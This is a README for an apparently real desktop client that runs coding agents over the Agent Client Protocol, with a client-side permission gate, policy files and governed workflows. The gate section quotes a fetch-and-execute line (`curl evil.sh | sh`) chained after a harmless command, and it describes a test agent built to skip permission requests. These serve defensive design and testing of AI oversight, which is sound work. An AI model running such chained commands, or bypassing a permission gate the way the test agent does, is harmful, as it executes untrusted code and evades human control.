# Event Horizon

**A Singularity tool.**

The boundary where intent crosses into execution. A desktop client for coding agents that speak
the [Agent Client Protocol](https://agentclientprotocol.com), built against
[GitHub Copilot CLI's ACP server](https://docs.github.com/en/copilot/reference/copilot-cli-reference/acp-server)
— but the app talks ACP, not Copilot, so any stdio ACP agent can be plugged in.

The name is the design principle: an agent can propose anything, but nothing crosses into your
working tree without passing through you. Every shell command, every edit, every path read is a
gate you answer, and the record of what you approved stays in the transcript.

```bash
npm install
npm run dev
```

Requires an ACP-capable agent on your PATH. For Copilot: `brew install copilot-cli && copilot login`.

Behind a private registry (Artifactory, Nexus, Verdaccio), use `npm run setup` instead of
`npm install` — see [Installing from an internal registry](#installing-from-an-internal-registry).

## Installing from an internal registry

```bash
export ARTIFACTORY_TOKEN=<token>
npm run setup -- --registry https://artifactory.corp/artifactory/api/npm/npm-virtual/
```

That writes a project-local `.npmrc`, checks the registry answers, and runs the install. `--scope
@acme` routes only that scope and leaves the public registry serving everything else; `--username`
switches to basic auth; `--no-auth` covers an IP-allowlisted mirror; `--ci` uses the lockfile.
`--dry-run` prints the `.npmrc` without writing it. `npm run setup -- --help` lists the rest.

**The token is never written to disk.** The `.npmrc` gets `${ARTIFACTORY_TOKEN}` and npm expands it
at read time. The catch this script exists to handle: npm leaves an *unset* variable as the literal
string `${ARTIFACTORY_TOKEN}`, which travels to the registry as your credential and returns a 401
that blames the token. So the variable is checked before anything runs.

### Electron does not come from the npm registry

Its postinstall downloads the binary from `github.com/electron/electron/releases`, and
electron-builder pulls its own toolchain from GitHub. On a network that only permits the internal
mirror, pointing npm at Artifactory succeeds at metadata and *then* fails at the download:

```bash
npm run setup -- \
  --registry         https://artifactory.corp/artifactory/api/npm/npm-virtual/ \
  --electron-mirror  https://artifactory.corp/artifactory/github/electron/electron/releases/download/ \
  --electron-builder-mirror https://artifactory.corp/artifactory/github/electron-builder/
```

Both are written into the `.npmrc` as `electron_mirror` / `electron_builder_binaries_mirror`, which
is where `@electron/get` and `app-builder-lib` look first — so a later plain `npm install` still
resolves them without re-running setup.

If the network terminates TLS with its own CA, add `--cafile /path/to/corp-ca.pem`. That sets npm's
`cafile` *and* exports `NODE_EXTRA_CA_CERTS`, because the binary downloads use Node's https stack
directly and never see npm's setting.

## What it does

- **Streaming chat** — assistant text, collapsible reasoning, and tool calls interleaved in the real order they happened.
- **Tool cards** — each call shows its kind, live status, the exact command, and its output. Failures open expanded.
- **Diffs** — file edits render as a unified diff with line numbers and collapsed context.
- **Inline permissions** — nothing runs until you approve it. `Y` / `A` / `N` for allow-once / always / deny, `Esc` to cancel. Answered prompts stay in the transcript showing what you chose.
- **Plans** — the agent's task list, updating as steps complete.
- **Live config** — model, mode (Agent / Plan / Autopilot), and reasoning effort are read from the agent and switchable mid-session.
- **Composer** — `/` completes the agent's advertised slash commands *and* locally-loaded skills, `@` completes workspace files. Mode, model, reasoning effort, and agent pickers sit in the composer bar, driven entirely by what the agent declares.
- **Attachments** — `+` adds files or folders. Files are embedded as ACP `resource` blocks (binaries referenced by path, oversized files truncated with disclosure); folders attach as a bounded listing. What was sent is recorded on the message.
- **Context meter** — live context-window usage with a full breakdown, plus session token totals.
- **Session actions** — compact the conversation, inspect or toggle agent memory, or start a fresh session on the same folder.
- **Tool profiles** — trade agent breadth for context. Measured: a 71% cut in per-request overhead (see below).
- **AST outlines** — attach a file's structure instead of its text. Measured 75% smaller across a real sample, 83–90% on implementation-heavy files.
- **Skills** — loaded from disk by the client, because Copilot's ACP server doesn't advertise them (see below).
- **Cost aggregation** — spend rolled up across every session by model, repository, and day, weighted by each model's cost multiplier.
- **Policy** — a JSON file can pin a tool profile, restrict models and agents, and disable blanket approval. Enforced in the main process, not the UI.
- **Multiple sessions** — each is its own agent process, scoped to its own directory. One crashing doesn't affect the others.

## Cost

Copilot bills premium *requests*, not tokens, and each model carries a multiplier — Haiku at 0.33x against Opus at 15x is a **45× spread for the same number of requests**. So the figure that tracks the invoice is a weighted request count, and that is what **⋯ → Usage across sessions** leads with. Tokens are reported alongside, because they drive context pressure — a different problem with a different fix.

Sessions that have not yet reported usage are counted separately and the total is marked a floor, never silently treated as zero. A model whose multiplier can't be parsed counts as 1x rather than free: treating it as free would hide exactly the sessions whose cost is least certain.

The data comes from the agent's own `/usage` output, captured after each turn and stored with the session, so the report survives a restart.

## Policy

`.event-horizon/policy.json`, read from — in increasing precedence — `~/`, then every directory from the workspace up to the filesystem root (outermost first, so the nearest wins), then whatever path `EVENT_HORIZON_POLICY` points at. The lookup is deliberately independent of git, so a directory that is not a repository still carries its policy.

```json
{
  "pinToolProfile": "lean",
  "allowedAgents": ["copilot"],
  "allowedModels": ["claude-sonnet-5", "claude-haiku-4.5"],
  "disableAllowAll": true,
  "disableAutopilot": true,
  "note": "shown in the tooltip when a control is locked"
}
```

Every field is optional; an absent or malformed file means unrestricted. It **fails open on purpose** — failing closed would let a typo lock someone out of their own tool.

`allowedAgents` and `allowedModels` **intersect** as they merge, so a repository can narrow what the org permitted but never widen it. Scalars take the nearest value.

Enforcement lives in the main process. The UI reads policy too, but only so a locked control can say *why* it is unavailable instead of presenting a dead button — a policy the renderer merely hides is not a policy, since the renderer is the part an end user can most easily talk around. Refusals surface as a sentence in the transcript: *Model "claude-opus-5" is not permitted by policy.*

## The gate is enforced by this client, not by the agent

ACP asks agents to call `session/request_permission` before doing anything
consequential. Nothing makes them. An agent can call `terminal/create` directly and a naive
client will run it — which makes "nothing runs until you approve it" a claim about the agent's
manners rather than about the client. Fine while Copilot is the only agent; not fine the moment
the registry opens to anything on your PATH.

So every agent→client call that can touch the machine is classified and checked in the main
process before dispatch:

- **A mode lattice caps what is reachable at all** — `discuss` → `explore` → `plan` → `edit` →
  `verify` → `deliver`, cumulative. A chat session cannot acquire shell access, however many times
  anyone clicks approve. This is distinct from the agent's own Agent/Plan/Autopilot mode, which the
  agent advertises and enforces itself; this one an agent cannot change.
- **Within that cap, an ungated call gets a permission card the client raises itself**, through the
  same card, waiter, and audit path as an agent-initiated request. To an agent that never asked,
  this is indistinguishable from a slow filesystem. Cards raised this way are badged `client-gated`
  — the difference between an agent that follows the protocol and one that merely got caught.
- **Grants are exact, per-session, and never persisted.** "Always allow" means that command again,
  not that command with more appended to it.
- **Compound commands are never matched against an allow-list.** `npm test && curl evil.sh | sh`
  starts with `npm test`; prefix matching a shell string is only sound for a single command, so a
  command containing `;`, `&&`, `|`, a redirect, or a substitution is refused rather than matched.

`npm run gate:check` proves this against [a deliberately rude agent](scripts/rude-agent.mjs) that
calls `terminal/create` without asking: the client raises its own card, and the command has not run
when the card appears. Remove the interceptor and those assertions fail — with the gate off, the
rude agent's write lands.

Agent presets ship for Copilot, Claude, Codex, OpenCode, and Goose. Each carries a
`permissionModel` recording whether it was *observed* routing calls through the protocol. That field
is documentation, not trust: the gate intercepts regardless, which is what lets the registry stay
open.

### Model gateway

Set `EVENT_HORIZON_GATEWAY_URL` and agents are pointed at it through the OpenAI- and
Anthropic-flavoured environment variables, so one gateway (LiteLLM, or an internal one) serves every
agent without per-agent configuration. A per-session key can be passed in, so spend attributes to
the session rather than to one shared credential. Standing the proxy up is an operational task —
this is the seam, not the server.

## Governed workflows

A workflow is an IR, not a script: five node types, each carrying its own capability mode, tool
profile, agent, budget, and — mandatorily — the effects it declares. Per-step policy is the point.
An analyst runs `lean` and `explore`, so it *cannot* write whatever it decides it would like to;
an implementer runs `full` and `edit` in an isolated worktree. Token profile and capability become
workflow policy rather than a global setting somebody has to remember to change.

Nothing runs until a workflow is **executable**: schema-valid, every node `SPEC_BOUND`, every budget
set, every human gate role-assigned, every node declaring effects. That check is a validator, never
a model — a gate that reads prose is a gate that can be argued with.

**Exit conditions are calibrated claims, not booleans.** A loop exits when its claims are accepted,
and a claim is evaluated *only* from signals this client captured itself — an exit code from a child
process it spawned, a report file it parsed. A signal an agent produced is refused with its own
reason. "The agent says the tests passed" is not evidence that the tests passed; it is evidence of
the agent saying so.

Each claim class carries a Beta posterior, so a class with a poor record needs more than one green
run to clear its threshold. It updates on acceptance only: a failing check inside a repair loop is
the expected path, not evidence the class is unreliable — counting it drove the posterior below its
own threshold after one iteration and no loop could ever exit again. Learning that an acceptance was
*wrong* needs a contradiction arriving later, which v1 has no way to observe.

**Human gates bind content hashes.** An approval that named "the design" would still read as granted
after the design was rewritten; `approvalStillValid()` returns false the moment the bytes change.

**Checkpoints after every node.** A run killed mid-loop resumes from its frontier: the analyst and
the implementer are not re-run, the approval is not re-requested, and the design's hash survives the
restart.

`npm run workflow:check` runs the hand-written golden path end to end against a toy repo through
real ACP sessions — analyse → hash-bound gate → implement → verify loop over real exit codes → PR
stub — then kills it mid-loop and resumes. The model is the only thing stubbed; a live one would
make "resumed without re-running" an assertion about luck.

### Compiling a workflow from a conversation

The compiler is not a translator. It works out what a conversation failed to settle and closes each
hole by exactly one of three routes — a versioned org playbook, a lookup against what is already
known about the repository, or a question to a person. Questions come last and are counted: a
compiler that asks which tool profile to use has spent the user's attention before reaching the
question that needed them.

**Holes are derived from the schema, never self-reported.** An extraction pass that failed to notice
a field would leave it out of its own hole list with equal confidence, so asking the model what it
missed inherits the miss. A `PartialWorkflow` is a distinct type from `Workflow`, and the only path
between them checks that nothing is open — a half-bound draft is unrepresentable at the point of
execution rather than merely rejected there.

An *inferred* value is not a bound one. A step whose writes were guessed from the conversation is
`PARTIAL`, not filled in: an unconfirmed guess about what a step writes is exactly the input a
mid-run constraint would silently get wrong.

The plan view is derived on every read and never stored. Edits are expressed against IR paths and
revalidated; fields the plan renders as derived are refused rather than styled as read-only.

`npm run compiler:check` compiles the golden-path conversation and scores it against the
hand-written M3 workflow. Differences are classified, because they are not comparable — reworded
prompts are the same workflow, differing timeouts permit the same actions, differing capability
modes do not. **Capability differences must be zero, and are.** It asks 6 questions: who approves,
how many attempts, what ends the loop, how each of the two claims is checked mechanically, and one
confirmation of an inferred effect. It does not ask which agent, which tool profile, which
capability mode, or how long anything may run.

## Standalone, or embedded in your own app

Both, from one codebase — they are not two modes. The UI imports no Electron and no Node, and
reaches its host through exactly one typed object, `AcpStudioApi`. The desktop app is simply the
first host, and its entry point is about twenty lines:

```tsx
const api = electronApi()                    // window.acp, from the preload bridge
createRoot(el).render(<EventHorizon api={api} />)
```

Any other host does the same with a different `api`:

```tsx
import { EventHorizon } from 'event-horizon/renderer'
import 'event-horizon/renderer/style.css'

<EventHorizon api={myHostApi} />
```

| Import | Runtime | What it is |
| --- | --- | --- |
| `event-horizon/renderer` | browser | the interface — transport-agnostic |
| `event-horizon/core` | node | the ACP engine — no Electron import |
| `event-horizon/shared` | either | `AcpStudioApi` and the view-model types |

Consumed as source, so your bundler compiles it and types resolve natively — no build artifact
to keep in sync. React 18+ is a peer dependency.

**→ [docs/embedding.md](docs/embedding.md)** has the full guide: recipes for another Electron
app, a VS Code webview, and a browser + daemon; the complete list of what an adapter must
implement; and the security boundary that a browser host introduces.

Two things worth knowing before you start. The engine (`src/main/`, minus `index.ts`) is plain
Node, so a CLI daemon or server can host it as easily as Electron. And a browser host is the one
genuinely harder case: a tab cannot spawn the agent or answer its `fs/*` calls, so a local
process must — one that executes shell commands on request, and therefore needs loopback
binding, a token, and origin checks. That daemon is not in the repo; it deserves a design pass,
not a copy-paste.

`npm run embed:check` drives the real store through a fake API — create a session, stage and
send attachments, expand a skill, change config, tear down — with no Electron, no agent process,
and no filesystem. `npm run guard` fails the build if the renderer ever reaches for
`window.acp`, `electron`, or a `node:` builtin again, since any of those silently re-welds the
UI to Electron: it keeps working in the desktop build and breaks every other host.

## Architecture

The renderer never touches Node. Everything crosses a typed `contextBridge` surface.

```
renderer (React)  ←AcpStudioApi→  host adapter  ←NDJSON/JSON-RPC over stdio→  agent
```

| Path | Role |
| --- | --- |
| `src/shared/acp.ts` | Protocol types, narrowed to what agents actually emit |
| `src/shared/ipc.ts` | IPC contract + the thread view-model |
| `src/main/acp/jsonrpc.ts` | Bidirectional JSON-RPC peer over newline-delimited JSON |
| `src/main/acp/session.ts` | Handshake, session lifecycle, update folding |
| `src/main/acp/workspaceFs.ts` | `fs/read_text_file`, `fs/write_text_file` + root containment |
| `src/main/acp/terminals.ts` | `terminal/*` with bounded output capture |
| `src/main/agents.ts` | Agent presets + login-shell PATH resolution |
| `src/main/manager.ts` | Owns live sessions, routes permission replies |

### Things worth knowing

**Dispatch on `method`, not `id`.** Agent→client requests use their own id space, so an
incoming `{id: 2, method: "session/request_permission"}` collides with your own outbound
request #2. Checking `id` first will resolve the wrong promise — this is the single easiest
way to break an ACP client, and it fails intermittently rather than loudly.

**GUI apps don't inherit your shell PATH.** A macOS app launched from Finder gets launchd's
minimal PATH, so `copilot` resolves in a terminal and mysteriously vanishes in the packaged
app. `src/main/agents.ts` asks the login shell for its real PATH once and caches it.

**Streaming updates are batched.** Agents emit a `session/update` per token; forwarding each
one over IPC swamps the renderer. Blocks are coalesced on a ~40ms tick, and text chunks fold
into the trailing block of the same kind rather than appending a node per token.

**Unknown update kinds are ignored, not fatal.** ACP is in preview and agents add variants;
an unrecognised `sessionUpdate` should render nothing, not crash the thread.

**Skills are loaded client-side, by necessity.** Copilot CLI 1.0.75's ACP server advertises its
32 built-in slash commands but not skills — `/skills` over ACP reports only the one builtin, and
installed-plugin skills never appear, even inside the plugin's own repo. (The server does load
plugins: their *agents* show up in the agent config option. Just not their skills.) Since a skill
is only a `SKILL.md` with frontmatter, `src/main/skills.ts` reads them directly from repo,
user, and plugin directories and expands an invocation into the prompt — which is what the
agent-side implementation does anyway.

Two rules make that safe. A name the agent advertises always wins, so a local file can never
shadow a real agent command and silently change behaviour. And the transcript shows the short
invocation you typed with a chip recording the skill, its source, and how many characters were
actually sent — the substitution is visible rather than hidden.

**Token accounting is scraped, not pushed.** ACP defines a `usage_update` session notification;
Copilot 1.0.75 never sends one. The numbers exist only in the rendered text of `/context` and
`/usage`, so the client runs those and parses them (`src/shared/contextInfo.ts`). Because that
output is human-facing and GitHub can change it freely, every parser returns null rather than
throwing, and a null degrades to "no meter" instead of a zeroed one — a meter reading 0%
would claim the context is empty when the truth is that we couldn't tell.

Those runs go through `runCommandSilent`, which captures streamed output instead of appending
it to the transcript. Since a silent refresh and a real turn share one agent and one
notification stream, every `session/prompt` is serialized through a queue — overlapping them
would put the refresh's output in your transcript and your turn's output in the capture buffer.

**Attachments really do reach the model.** An embedded `resource` block is honoured even for a
URI that exists nowhere on disk: Copilot materializes it to a temp file and reads it. This is
verified in `attach:check` by attaching a file outside the session's cwd containing a marker
that no tool could otherwise find, and asserting the model reports it back.

**Most of a session's context is spent before you type anything.** Measured on a fresh Copilot
session, via `/context` after one message:

| | System Prompt | System Tools | MCP Tools | Fixed overhead |
| --- | --- | --- | --- | --- |
| Full (default) | 5.8k | 8.1k | 0.9k | **14,739** |
| No MCP | 5.5k | 8.1k | 0 | 13,600 |
| Lean (`bash,view`) | 3.4k | 0.9k | 0 | **4,306** |
| Minimal (`bash`) | 3.5k | 0.6k | 0 | 4,068 |

Tool definitions are re-sent on every request, so this is a per-request cost, not a one-off.
Lean cuts it by **71% — about 10.4k tokens per request**. The system prompt shrinks alongside
the tools because it describes them, so the saving compounds.

This is a real tradeoff, not free money: `bash` alone can do most of what a shell can, but the
agent loses purpose-built editing and search and may burn extra turns reimplementing them. Full
stays the default; the lean profiles are for long sessions where context pressure outweighs
breadth. Because these are spawn flags with no ACP equivalent, the choice is fixed for a
session's lifetime — `restartSession` deliberately carries it over rather than silently
re-inflating to Full.

**Attach structure, not text.** Most questions about a file need its shape, not its
implementation. `src/main/ast/outline.ts` parses TS/JS with the TypeScript compiler — already a
dependency, so no native module or WASM grammar — and emits declarations with bodies stripped.
Measured on this repo:

| file | full | outline | saving |
| --- | --- | --- | --- |
| `renderer/components/Composer.tsx` | 2,449 | 235 | 90% |
| `main/attachments.ts` | 1,849 | 295 | 84% |
| `main/acp/session.ts` | 5,080 | 887 | 83% |
| `main/manager.ts` | 966 | 313 | 68% |
| `shared/ipc.ts` | 1,684 | 1,298 | 23% |
| **total** | **12,028** | **3,028** | **75%** |

(approximate tokens at 4 chars each)

`ipc.ts` saves least because it is nearly all type declarations — those *are* signatures, so
there is nothing to strip. That is the honest shape of the tradeoff, not a defect.

Unlike a grep excerpt, an outline is structurally complete: every declaration is present and
none are half-quoted. Languages the parser doesn't cover fall back to full content and say so on
the chip rather than silently sending something less useful.

**Token size and billing are different things.** Copilot bills premium requests with a
per-model multiplier, not tokens — Haiku 0.33x against Opus 15x is a 45x spread, and it was
already on the wire in `_meta.copilotUsage` while being invisible in the UI. The model picker
now shows it. Tool profiles reduce *context pressure* and latency; the model multiplier is what
moves the bill.

## Verifying

```bash
npm run check              # everything below, in order
npm run smoke              # one real prompt turn, end to end
npm run install:check      # registry config is correct and never contains a token
npm run gate:check         # a rude agent is stopped; symlinks cannot leave the workspace
npm run workflow:check     # the golden path runs, is killed mid-loop, and resumes
npm run compiler:check     # a conversation compiles to the same workflow, in <=6 questions
npm run skills:check [cwd] # skill discovery, precedence, expansion
npm run context:check      # /context and /usage parsers (offline)
npm run attach:check       # attachments reach the model; silent commands stay silent
npm run profile:check      # tool-profile flags reach spawn AND measurably reduce overhead
npm run outline:check      # AST outlines keep structure and drop bodies
npm run index:check        # the AST index invalidates on edit and reloads warm
npm run persist:check      # transcripts survive a restart and resume the agent
npm run policy:check       # cost totals never understate; policy cannot be widened
npm run provider:check     # no concrete host is wired into the core
npm run contract:check     # the embedding contract matches what is exported
npm run embed:check        # the UI runs with no Electron, no agent, no filesystem
npm run guard              # the UI has not re-coupled itself to Electron
```

Spawns the real agent, runs a prompt that forces a tool call, auto-approves the permission
request, and asserts the whole pipeline — handshake, model/config advertisement, streamed
text, tool call reaching `completed`, `end_turn`, and an actual file mutation on disk.

`skills:check` covers the skill pipeline: discovery across all roots, frontmatter parsing,
menu ordering and precedence (including a deliberate agent/skill name clash in both the menu
and the send path), argument capture, and the shape of the expanded prompt.

`context:check` runs offline against captured `/context` and `/usage` fixtures, including the
`<1%` and no-suffix (`426`) cases and four different malformed inputs that must degrade to null.

`attach:check` builds blocks for a text file, a binary, an oversized file, a folder, and a
missing path, then spawns the real agent and asserts it can read a marker that exists only
inside the attachment — plus that a silent `/context` leaves the transcript untouched.

```bash
npm run typecheck
npm run build
npm run dist      # packaged .dmg
```

## Status

Verified end to end against Copilot CLI 1.0.75.

Not yet implemented: session resume via `session/load`, MCP server configuration passthrough
on `session/new`, image/audio attachments in the composer, and a persistent transcript
(sessions live in memory and end with the process).
